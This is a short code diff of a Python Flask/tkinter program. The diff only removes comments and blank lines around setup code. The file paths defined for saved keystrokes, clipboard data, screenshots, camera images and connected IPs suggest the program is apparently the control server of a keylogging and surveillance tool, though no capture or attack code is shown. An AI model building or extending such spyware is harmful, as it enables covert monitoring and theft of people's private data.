@@ -24,16 +24,11 @@ import tkinter as tk
 from tkinter import scrolledtext, ttk, filedialog
 from werkzeug.serving import make_server
 
-# Flask app setup
 app = Flask(__name__)
 
-# Global variable to manage server state
 server = None
-
-# Configure logging
 logger = logging.getLogger()
 logger.setLevel(logging.INFO)
-# File paths and directories
 keystrokes_file_path = 'saved_keystrokes.txt'
 clipboard_file_path = 'saved_clipboard.txt'
 screenshots_dir = 'screenshots'
@@ -41,7 +36,6 @@ camera_images_dir = 'camera_images'
 connected_ips_file_path = 'connected_ips.txt'
 os.makedirs(screenshots_dir, exist_ok=True)
 os.makedirs(camera_images_dir, exist_ok=True)
-# Flag for logging clipboard data, screenshot data, and camera images
 show_clipboard_in_logs = True
 show_screenshot_logs = True
 show_camera_logs = True
